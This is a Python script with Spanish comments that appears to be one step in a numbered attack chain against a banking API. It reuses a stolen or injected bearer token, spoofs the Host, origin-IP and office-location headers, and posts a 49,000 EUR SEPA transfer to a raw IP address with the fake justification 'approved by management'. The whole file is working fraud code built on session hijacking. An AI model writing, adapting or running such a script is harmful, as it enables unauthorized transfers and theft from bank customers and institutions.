import requests

# URL de envío de transferencia SEPA
transfer_url = "http://80.78.30.242:9181/api/send-transfer"

# Datos de la transferencia real
transfer_data = {
    "iban_origen": "ES8000180001234567890123",
    "iban_destino": "ES9100289392790001457822",
    "monto": "49000.00",
    "currency": "EUR",
    "reason": "Operación aprobada por gerencia",
    "timestamp": "2025-07-06T14:45:00Z",  # Ejecutado ahora
}

# === Continuamos con la misma sesión ===
session = requests.Session()
# Usa el token recibido en script 07 o inyecta uno válido si lo tienes desde otra conexión
session.headers.update({
    "Host": "80.78.30.27",
    "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoiYWNjZXNzIiwiZXhwIjoxNzIwMjMxMjQxLCJpYXQiOjE3MjAyMjg4NDEsImp0aSI6ImU3ZDY4ZTYyOWRkNGY0NjRjOTJiNWZlNzU3ODQ4NTNkOCIsImVtcGxvcmFkb3JfbF9pZCI6MTAwMDMsInVzZXJuYW1lIjoibWFya211cjg4In0.01W1YxX6v2VfWJ6Z1sNl2sKQ8v8Z3aY048571Z0Y3v8Z9V4=",
    "X-Token-ID": "5122535311.eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXUCJ9.eyJlbXBsb3JhZG9yX2xfaWQiOjEwMDAzLCJlbXBsb3JhZG9yX2xsYW1hZG8iOiJzaW11bGFkb3JfYmFuY29fYXV0aC5sb2dpbl9pbnRlcm5hbCIsInVzZXJuYW1lIjoibWFya211cjg4In0.1sNl2sKQ7O2VfWJ6Z1sNl2sKQ8v8Z3aY0",
    "X-Origin-IP": "192.168.1.10",
    "X-Location": "OFICINA-CENTRAL-ES"
})

# === Enviar transferencia SEPA desde sesión validada ===
xfer_response = session.post(transfer_url, json=transfer_data)
print("Respuesta del sistema:", xfer_response.text)
print("Status:", xfer_response.status_code)

# === (Opcional): verificar estado desde /status-transfer si existe